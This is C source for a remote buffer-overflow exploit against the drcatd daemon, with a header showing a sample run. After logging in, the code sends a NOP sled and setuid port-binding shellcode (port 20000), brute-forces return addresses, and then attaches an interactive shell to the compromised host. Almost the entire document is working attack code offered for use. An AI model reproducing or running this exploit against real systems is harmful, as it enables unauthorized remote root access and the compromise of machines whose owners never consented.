/*

Proof of Concept DRCATD Remote exploit
                               by Taif
__
Test:
[root@localhost drcat]# ./drcat -d 127.0.0.1 -u taif -p test
Public code by Taif
drcat-0.5.0-beta ('remote r00t' proof)
Bug found by Khan Shirani

host: +-+-+-+-+-+-+-+
      127.0.0.1 |C|L|U|P|C|S|R|
user: |O|O|S|A|O|E|O|
           taif |O|G|E|S|D|N|O|
password: |N|O|R|S|E|D|T|
           test | | | | | | | |
---------retaddr---+-+-+-+-+-+-+-+
       bfefc000 * * * * * * X
       bfefbfd1 * * * * * * X
       bfefbfa2 * * * * * * X
       bfefbf73 * * * * * * X
       bfefbf44 * * * * * * X
       bfefbf15 * * * * * * X
       bfefbee6 * * * * * * X
       bfefbeb7 * * * * * * X
       bfefbe88 * * * * * * X
       bfefbe59 * * * * * * X
       bfefbe2a * * * * * * X
       bfefbdfb * * * * * * X
       bfefbdcc * * * * * * X
       bfefbd9d * * * * * * X
       bfefbd6e * * * * * * X
       bfefbd3f * * * * * * X
       bfefbd10 * * * * * * X
       bfefbce1 * * * * * * X
       bfefbcb2 * * * * * * X
       bfefbc83 * * * * * * X
       bfefbc54 * * * * * * X
       bfefbc25 * * * * * * X
       bfefbbf6 * * * * * * X
       bfefbbc7 * * * * * * X
       bfefbb98 * * * * * * X
       bfefbb69 * * * * * * X
       bfefbb3a * * * * * * X
       bfefbb0b * * * * * * X
       bfefbadc * * * * * * X
       bfefbaad * * * * * * X
       bfefba7e * * * * * * X
       bfefba4f * * * * * * X
       bfefba20 * * * * * * X
       bfefb9f1 * * * * * * X
       bfefb9c2 * * * * * * X
       bfefb993 * * * * * * X
       bfefb964 * * * * * * X
       bfefb935 * * * * * * X
       bfefb906 * * * * * * X
       bfefb8d7 * * * * * * X
       bfefb8a8 * * * * * * X
       bfefb879 * * * * * * X
       bfefb84a * * * * * * X
       bfefb81b * * * * * * X
       bfefb7ec * * * * * * X
       bfefb7bd * * * * * * X
       bfefb78e * * * * * * X
       bfefb75f * * * * * * X
       bfefb730 * * * * * * X
       bfefb701 * * * * * * X
       bfefb6d2 * * * * * * X
       bfefb6a3 * * * * * * X
       bfefb674 * * * * * * X
       bfefb645 * * * * * * X
       bfefb616 * * * * * * X
       bfefb5e7 * * * * * * X
       bfefb5b8 * * * * * * X
       bfefb589 * * * * * * X
       bfefb55a * * * * * * X
       bfefb52b * * * * * * X
       bfefb4fc * * * * * * *
* HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN *
Linux localhost.localdomain 2.4.26 #9 P ?ec 2 09:20:29 CEST 2004 i686 athlon i386 GNU/Linux
uid=500(taif) gid=500(taif) groups=500(taif)
10:04pm up 1:00, 1 user, load average: 0.42, 0.35, 0.20
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
....


NOTE:
Use this on your own risk!!
This exploit is unnecessary!!
*/


#include <stdio.h>
#include <netdb.h>
#include <unistd.h>

#define MAXDATASIZE (1024 * 4)

/* Color Pallete ... i love colors;) */
#define YELLOW "\E[33m"
#define GREEN "\E[32m"
#define RED "\E[31m"
#define RESTORE "\E[0m"


#define PRINTGREEN(string) \
       printf("%s%s%s",GREEN,string,RESTORE); \
       fflush(stdout);

#define PRINTRED(string) \
       printf("%s%s%s",RED,string,RESTORE); \
       fflush(stdout);

#define PRINTYELLOW(string) \
       printf("%s%s%s",YELLOW,string,RESTORE); \
       fflush(stdout);

/* portbind 20000 (by bighawk) *
* +setuid() */
char code[] =
"\x31\xc0" /* xorl %eax,%eax */
"\x31\xdb" /* xorl %ebx,%ebx */
"\xb0\x17" /* movb $0x17,%al */
"\xcd\x80" /* int $0x80 */
"\x31\xdb" /* xor ebx, ebx */
"\xf7\xe3" /* mul ebx */
"\xb0\x66" /* mov al, 102 */
"\x53" /* push ebx */
"\x43" /* inc ebx */
"\x53" /* push ebx */
"\x43" /* inc ebx */
"\x53" /* push ebx */
"\x89\xe1" /* mov ecx, esp */
"\x4b" /* dec ebx */
"\xcd\x80" /* int 80h */
"\x89\xc7" /* mov edi, eax */
"\x52" /* push edx */
"\x66\x68\x4e\x20"/* push word 8270 */
"\x43" /* inc ebx */
"\x66\x53" /* push bx */
"\x89\xe1" /* mov ecx, esp */
"\xb0\xef" /* mov al, 239 */
"\xf6\xd0" /* not al */
"\x50" /* push eax */
"\x51" /* push ecx */
"\x57" /* push edi */
"\x89\xe1" /* mov ecx, esp */
"\xb0\x66" /* mov al, 102 */
"\xcd\x80" /* int 80h */
"\xb0\x66" /* mov al, 102 */
"\x43" /* inc ebx */
"\x43" /* inc ebx */
"\xcd\x80" /* int 80h */
"\x50" /* push eax */
"\x50" /* push eax */
"\x57" /* push edi */
"\x89\xe1" /* mov ecx, esp */
"\x43" /* inc ebx */
"\xb0\x66" /* mov al, 102 */
"\xcd\x80" /* int 80h */
"\x89\xd9" /* mov ecx, ebx */
"\x89\xc3" /* mov ebx, eax */
"\xb0\x3f" /* mov al, 63 */
"\x49" /* dec ecx */
"\xcd\x80" /* int 80h */
"\x41" /* inc ecx */
"\xe2\xf8" /* loop lp */
"\x51" /* push ecx */
"\x68\x6e\x2f\x73\x68"/* push dword 68732f6eh */
"\x68\x2f\x2f\x62\x69"/* push dword 69622f2fh */
"\x89\xe3" /* mov ebx, esp */
"\x51" /* push ecx */
"\x53" /* push ebx */
"\x89\xe1" /* mov ecx, esp */
"\xb0\xf4" /* mov al, 244 */
"\xf6\xd0" /* not al */
"\xcd\x80"; /* int 80h */

void banner()
{
fprintf(stderr,"Public code by Taif \n"
              "drcat-0.5.0-beta (\'remote r00t\' proof)\n"
              "Bug found by Khan Shirani \n\n");
}

void usage (char *progname)
{
int i;
fprintf (stderr, "usage: %s arguments \n\n"
                "-d hostanme (127.0.0.1) \n"
                "-u user (NULL) \n"
                "-p password (NULL) \n"
                "-P port (3535) \n"
                "-t timeout (1000=1s) (300) \n"
                "\n", progname);


exit (0);
}

int conn(char *ip,int port)
{
int sock;
struct hostent *host;
struct sockaddr_in addr;

if((host=gethostbyname(ip))==NULL)
 { PRINTRED("X\ngethostbyname()\n"); exit(1); }

addr.sin_family=AF_INET;
addr.sin_port=htons(port);
addr.sin_addr=*((struct in_addr *)host->h_addr);
memset(&(addr.sin_zero),0,8);


if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
 { PRINTRED("X\nsocket()\n"); exit(1); }

if(connect(sock,(struct sockaddr *)&addr,sizeof(struct sockaddr))==-1)
 { PRINTRED("X\n"); return(-1);}

return(sock);
}

void login(int sock,char* user,char *pass)
{
char buffer[1024];
int n;

memset(buffer,0,sizeof(buffer));
n=recv(sock, buffer, 6, 0);
if(n<0) { PRINTRED("\nrecv()\n"); exit(1); }
if(n==6)
 {
 if(strcmp(buffer, "drcatd")) {PRINTYELLOW("* ");}
   else {PRINTGREEN("* ");};
 }
else {PRINTYELLOW("* ");}

if(send(sock, user, strlen(user), 0) == -1)
 {PRINTRED("\nsend()\n");close(sock);exit(1);}

n=recv(sock, buffer, 1, 0);
if(buffer[0] == '0')
 {
 PRINTRED("X\nINVALID USER\n");
 close(sock);
 exit(1);
 }
else {PRINTGREEN("* ")};

if(send(sock, pass, strlen(pass), 0) == -1)
 {PRINTRED("send()\n");close(sock);exit(1);}

n=recv(sock, buffer, 1, 0);
 if(buffer[0] == '0')
 {
 PRINTRED("X\nINVALID PASSWORD\n");
 close(sock);
 exit(1);
 }
return;
}

/* change with care */
#define TOP 290

void makec0de(char* haox,unsigned int ret)
{
int i;

memset(haox,0,512);
memset(haox,0x90,TOP);
for (i=0;i<sizeof(code)-1;i++)
haox[TOP-sizeof(code)+i]=code[i];
/* yeah fucking thing (ret%4) */
for (i=TOP-(ret%4);i<504;i=i+4)
*(long *)&haox[i]=ret;
}

void send_it(int sock,char* buffer)
{
int len;

len=strlen(buffer);
if (send(sock, buffer, len, 0) == -1)
 {
 PRINTRED("X\nsend()\n");
 close(sock);
 exit(1);
 }
return;
}

int sh(int sock)
{
char snd[1024], rcv[1024];
fd_set rset;
int maxfd, n;
int received = 0;

//strcpy(snd,"TERM=xterm; export TERM=xterm; exec bash -i\n");
//write(sock, snd, strlen(snd));

strcpy(snd, "uname -a; id; w\n");
write(sock, snd, strlen(snd));

for (;;)
{
FD_SET(fileno(stdin), &rset);
FD_SET(sock, &rset);

maxfd = ( ( fileno(stdin) > sock )?fileno(stdin):sock ) + 1;
select(maxfd, &rset, NULL, NULL, NULL);

if (FD_ISSET(fileno(stdin), &rset))
 {
 bzero(snd, sizeof(snd));
 fgets(snd, sizeof(snd)-2, stdin);
 write(sock, snd, strlen(snd));
 }

if (FD_ISSET(sock, &rset))
 {
 bzero(rcv, sizeof(rcv));
 if ((n = read(sock, rcv, sizeof(rcv))) == -1)
   {
   printf("FUCK: Error in read\n");
   exit(1);
   }
 if (!n)
   {
   if (!received)
     {
     printf("FUCK: failed.\n\n");
     return 0;
     }
   printf("Connection closed.\n");
   exit(1);
   }

 received = 1;
 fputs(rcv, stdout);
 fflush(stdout);
 }
}
}

int main(int argc, char *argv[]){
char buff[MAXDATASIZE];
char *host, *user,*pass,c;
int sockfd,sockfd2;
int port = 3535;
int time = 300;
int ret=0xc0000000-(MAXDATASIZE*260);

host="127.0.0.1";
user=NULL;
pass=NULL;

banner();
if (argc<2) usage (argv[0]);

while((c=getopt(argc,argv,"?hd:u:p:P:t:"))!=-1)
       {
               switch(c)
               {
               case 't':
                               time=atoi(optarg);
                               break;
               case 'P':
                               port=atoi(optarg);
                               break;
               case 'u':
                               user=optarg;
                               break;
               case 'd':
                               host=optarg;
                               break;
               case 'p':
                               pass=optarg;
                               break;
               case '?':
               case 'h':
               default:
                               usage (argv[0]);
                               break;

               }
       }

if (host==NULL)
 {PRINTRED("Set host!\n");usage (argv[0]);}
if (user==NULL)
 {PRINTRED("Set user!\n");usage (argv[0]);}
if (pass==NULL)
 {PRINTRED("Set password!\n");usage (argv[0]);}
 
printf(" host: +-+-+-+-+-+-+-+\n"
      "%16s |C|L|U|P|C|S|R|\n"
      " user: |O|O|S|A|O|E|O|\n"
      "%16s |O|G|E|S|D|N|O|\n"
      " password: |N|O|R|S|E|D|T|\n"
      "%16s | | | | | | | |\n"
      "---------retaddr---+-+-+-+-+-+-+-+\n"
      ,host,user,pass);fflush(stdout);
while(1)
{
printf("%16x ",ret);fflush(stdout);
sockfd=conn(host,port);
if (sockfd<0) {PRINTRED("connect()\n");exit(1);}
 else PRINTGREEN("* ");
login(sockfd,user,pass);PRINTGREEN("* ");
makec0de(buff,ret);PRINTGREEN("* ");
send_it(sockfd,buff);PRINTGREEN("* ");
close(sockfd);
usleep(time*1000);
sockfd=conn(host,20000);
if (!(sockfd<0))
 {
 PRINTGREEN("*\n");
 PRINTGREEN("* HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN *\n");
 sh(sockfd);
 close(sockfd);
 exit(0);
 }
ret=ret-((TOP-sizeof(code))/4);
}
exit(0);

}

